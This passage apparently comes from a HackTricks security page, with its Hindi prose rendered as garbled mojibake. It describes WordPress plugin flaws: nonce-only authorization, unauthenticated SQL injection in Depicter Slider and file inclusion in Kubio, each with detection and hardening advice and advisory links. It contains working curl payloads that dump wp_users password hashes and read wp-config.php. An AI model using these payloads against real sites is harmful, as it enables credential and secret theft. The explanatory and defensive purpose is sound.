Detection checklist
- REST/AJAX handlers рдЬреЛ plugins/themes рдХреЛ modify рдХрд░рддреЗ рд╣реИрдВ рдкрд░ рдХреЗрд╡рд▓ wp_verify_nonce()/check_admin_referer() рдореМрдЬреВрдж рд╣реЛрдВ рдФрд░ capability check рди рд╣реЛ
- рдХреЛрдИ рднреА code path рдЬреЛ nonce validation рдХреЗ рдмрд╛рдж $skip_caps = true рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ

Hardening
- nonces рдХреЛ рдХреЗрд╡рд▓ CSRF tokens рдХреЗ рд░реВрдк рдореЗрдВ рд╣реА рдорд╛рдиреЗрдВ; nonce рдХреА рд╕реНрдерд┐рддрд┐ рдЪрд╛рд╣реЗ рдЬреЛ рднреА рд╣реЛ capability checks рд▓рд╛рдЧреВ рдХрд░реЗрдВ
- installer code рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ current_user_can('install_plugins') рдФрд░ current_user_can('activate_plugins') рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд░рдЦреЗрдВ
- рдЕрдирдкреНрд░рдорд╛рдгреАрдХреГрдд рдПрдХреНрд╕реЗрд╕ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ; рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдлреНрд▓реЛрдЬрд╝ рдХреЗ рд▓рд┐рдП nopriv AJAX actions рдХреЛ expose рдХрд░рдиреЗ рд╕реЗ рдмрдЪреЗрдВ

---

## рдЕрдирдкреНрд░рдорд╛рдгреАрдХреГрдд SQLi via s search parameter in depicter-* actions (Depicter Slider тЙд 3.6.1)

Multiple depicter-* actions рдиреЗ s (search) рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдФрд░ рдЙрд╕реЗ parameterization рдХреЗ рдмрд┐рдирд╛ SQL queries рдореЗрдВ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ред

- Parameter: s (search)
- Flaw: WHERE/LIKE рдХреНрд▓реЙрдЬрд╝ рдореЗрдВ direct string concatenation; рдХреЛрдИ prepared statements/sanitization рдирд╣реАрдВ
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep рдХрд░рдХреЗ depicter-* action handlers рдФрд░ SQL рдореЗрдВ рд╕реАрдзреЗ $_GET['s'] рдпрд╛ $_POST['s'] рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рдЦреЛрдЬреЗрдВ
- $wpdb->get_results()/query() рдХреЛ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рдХрд╕реНрдЯрдо рдХреНрд╡реЗрд░реАрдЬ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬреЛ s рдХреЛ concatenate рдХрд░ рд░рд╣реА рд╣реИрдВ

Hardening
- рд╣рдореЗрд╢рд╛ $wpdb->prepare() рдпрд╛ wpdb placeholders рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ; рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдЕрдирдкреЗрдХреНрд╖рд┐рдд metacharacters рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ
- s рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдЦреНрдд allowlist рдЬреЛрдбрд╝реЗрдВ рдФрд░ рдЕрдкреЗрдХреНрд╖рд┐рдд charset/length рдореЗрдВ normalize рдХрд░реЗрдВ

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder тЙд 2.5.1)

template parameter рдореЗрдВ normalization/containment рдХреЗ рдмрд┐рдирд╛ attacker-controlled paths рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ arbitrary local files рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ, рдФрд░ рдХрднреА-рдХрднрд╛рд░ code execution рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ includable PHP/log рдлрд╛рдЗрд▓реЗрдВ runtime рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░ рджреА рдЬрд╛рдПрдБред

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: рдХреЛрдИ normalization/allowlisting рдирд╣реАрдВ; traversal рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ
- Impact: рдЧреЛрдкрдиреАрдп рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛ (wp-config.php), specific environments рдореЗрдВ potential RCE (log poisoning, includable PHP)

PoC тАУ wp-config.php рдкрдврд╝реЗрдВ
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЪреЗрдХрд▓рд┐рд╕реНрдЯ
- рдХреЛрдИ рднреА handler рдЬреЛ request paths рдХреЛ include()/require()/read sinks рдореЗрдВ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдмрд┐рдирд╛ realpath() containment рдХреЗ
- traversal patterns (../) рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ рдЗрд░рд╛рджрддрди templates directory рдХреЗ рдмрд╛рд╣рд░ рдкрд╣реБрдБрдЪрддреЗ рд╣реЛрдВ

рдХрдареЛрд░рдХрд░рдг
- Allowlisted templates рд▓рд╛рдЧреВ рдХрд░реЗрдВ; realpath() рд╕реЗ resolve рдХрд░реЗрдВ рдФрд░ рдЪреЗрдХ рдХрд░реЗрдВ рдХрд┐ str_starts_with(realpath(file), realpath(allowed_base))
- рдЗрдирдкреБрдЯ рдХреЛ normalize рдХрд░реЗрдВ; traversal sequences рдФрд░ absolute paths рдХреЛ reject рдХрд░реЗрдВ; sanitize_file_name() рдХреЗрд╡рд▓ filenames рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдкреВрд░реНрдг paths рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ)


## рд╕рдВрджрд░реНрдн

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset тАУ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments тЙд 5.6.1 тАУ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation тАУ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025тАЩs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) тЙд 1.0.82 тАУ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations тЙд 3.5.3 тАУ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider тЙд 3.6.1 тАУ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder тЙд 2.5.1 тАУ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
